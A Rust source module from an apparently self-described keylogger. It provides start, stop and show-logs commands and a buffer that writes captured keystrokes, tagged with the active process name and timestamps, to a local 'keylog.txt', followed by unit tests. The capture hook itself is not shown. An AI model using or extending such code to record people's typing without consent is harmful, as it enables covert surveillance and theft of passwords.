use clap::{Subcommand, Parser};
use std::sync::Mutex;
use std::fs::OpenOptions;
use std::io::Write;
use once_cell::sync::Lazy;
use chrono::prelude::DateTime;
use chrono::Utc;
use crate::process_identification::{LAST_PROCESS_NAME};
use crate::formatting::update_status_header;

#[derive(Parser, Debug)]
#[command(name = "")]
pub struct KeyloggerCommands {
    #[command(subcommand)]
    pub command: Commands,
}

#[derive(Subcommand, Debug)]
pub enum Commands {
    /// Starts key listener
    StartKeyListener,
    /// Stops key listener
    StopKeyListener,
    /// Reveals keylogger logs
    ShowLogs {
        #[arg[short = 'v', long = "verbose"]]
        verbose: bool
    },
    /// Quit Program
    QuitProgram,
}

/// Manages buffered keyboard input logging with a configurable buffer size
pub struct KeyBuffer<W: Write> {
    buffer: Vec<u16>,
    max_size: usize,
    writer: W
}

impl<W: Write> KeyBuffer<W> {
    /// Creates a new KeyBuffer with default settings
    pub fn new(writer: W) -> Self {
        Self::with_capacity(8, writer)
    }
    
    /// Creates a KeyBuffer with custom capacity and file path
    pub fn with_capacity(max_size: usize, writer: W) -> Self {
        Self {
            buffer: Vec::with_capacity(max_size),
            max_size,
            writer,
        }
    }
    
    /// Adds characters to the buffer, flushing to disk when full
    pub fn push_chars(&mut self, chars: &[u16]) -> Result<(), std::io::Error> {
        // If adding these chars exceeds capacity, flush first
        if self.len() + chars.len() >= self.max_size {
            self.flush_to_disk(None, None)?;
        }
        
        self.buffer.extend_from_slice(chars);

        Ok(())
    }
    
    /// Forces a flush of the current buffer to the disk
    pub fn flush_to_disk(&mut self, current_name: Option<&str>, process_changed: Option<bool>) -> Result<(), std::io::Error> {
        if self.is_empty() {
            return Ok(());
        }
        
        let content = String::from_utf16(&self.buffer)
            .map_err(|_| std::io::Error::new(
                std::io::ErrorKind::InvalidData, 
                "Invalid UTF-16 sequence"
            ))?;
            
        let process_name = match LAST_PROCESS_NAME.try_lock() {
            Ok(guard) => guard.as_ref().cloned().unwrap_or_else(|| "Unknown Process".to_string()),
            Err(_) => "Unknown Process (lock unavailable)".to_string(),
        };

        if process_changed.unwrap_or(false) {
            // Add timestamp and process name to the log
            let now: DateTime<Utc> = Utc::now();
            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
            let header = format!("\n\n{} - {} - {}\n", process_name, timestamp, "=".repeat(50));
            // Write the header to the file
            self.writer.write_all(header.as_bytes())?;
        }
        // Write the buffer content to the file
        self.writer.write_all(content.as_bytes())?;

        // If current_name is provided, add timestamp header and name
        if let Some(current_name) = current_name {
            let now: DateTime<Utc> = Utc::now();
            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
            let header = format!("\n\n{} - {} - {}\n", current_name, timestamp, "-".repeat(50));
            self.writer.write_all(header.as_bytes())?;
        }

        self.writer.flush()?;

        self.buffer.clear();
        update_status_header("💾 Saved Buffer").unwrap();
        Ok(())
    }
    
    /// Returns the current buffer size
    pub fn len(&self) -> usize {
        self.buffer.len()
    }
    
    /// Checks if the buffer is empty
    pub fn is_empty(&self) -> bool {
        self.buffer.is_empty()
    }
}

// Thread-safe global instance
pub static GLOBAL_KEY_BUFFER: Lazy<Mutex<KeyBuffer<std::fs::File>>> = Lazy::new(|| {
    let file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")
        .expect("Failed to open or create log file");
    Mutex::new(KeyBuffer::new(file))
});

#[cfg(test)]
mod tests {
    #[derive(Debug, Clone)]
    struct DummyWriter {
        buffer_len: usize,
        flush_count: usize,
    }
    
    impl Write for DummyWriter {
        fn write(&mut self, buf: &[u8]) -> Result<usize, std::io::Error> {
            self.buffer_len = buf.len();
            Ok(self.buffer_len)  // Simulate successful write
        }

        fn flush(&mut self) -> Result<(), std::io::Error> {
            self.flush_count += 1;
            Ok(()) // Simulate successful flush
        }
    }
    impl PartialEq for DummyWriter {
        fn eq(&self, _other: &Self) -> bool {
            true // All DummyWriter instances are considered equal
        }
    }
    impl DummyWriter {
        fn new() -> Self {
            DummyWriter {
                buffer_len: 0,
                flush_count: 0,
            }
        }
    }
    
    use std::any::{Any, TypeId};
    use super::*;


    #[test]
    fn test_keybuffer_has_correct_default_datatypes() {
        let key_buffer = KeyBuffer::new(DummyWriter::new());
        
        assert_eq!(key_buffer.max_size.type_id(), TypeId::of::<usize>());
        assert_eq!(key_buffer.buffer.type_id(), TypeId::of::<Vec<u16>>());
        assert_eq!(key_buffer.writer.type_id(), TypeId::of::<DummyWriter>());
    }
    #[test]
    fn test_keybuffer_has_correct_default_params() {
        let dummy_writer = DummyWriter::new();
        let key_buffer = KeyBuffer::new(dummy_writer.clone());
        
        assert_eq!(key_buffer.max_size, 8);
        assert_eq!(key_buffer.buffer.capacity(), 8);
        assert_eq!(key_buffer.writer, dummy_writer);
    }
    #[test]
    fn test_keybuffer_with_capacity_initialization() {
        let dummy_writer = DummyWriter::new();
        let key_buffer = KeyBuffer::with_capacity(16, dummy_writer.clone());
        
        
        assert_eq!(key_buffer.max_size, 16);
        assert_eq!(key_buffer.buffer.capacity(), 16);
        assert_eq!(key_buffer.writer, dummy_writer);
    }
    #[test]
    fn test_keybuffer_successfully_pushes_chars() {
        let dummy_writer = DummyWriter::new();
        let mut key_buffer = KeyBuffer::new(dummy_writer);
        let chars = vec![65u16, 66u16, 67u16]; // 'A', 'B', 'C'
        let result = key_buffer.push_chars(&chars);
        
        
        assert!(result.is_ok());
        assert_eq!(key_buffer.buffer, chars);
    }
}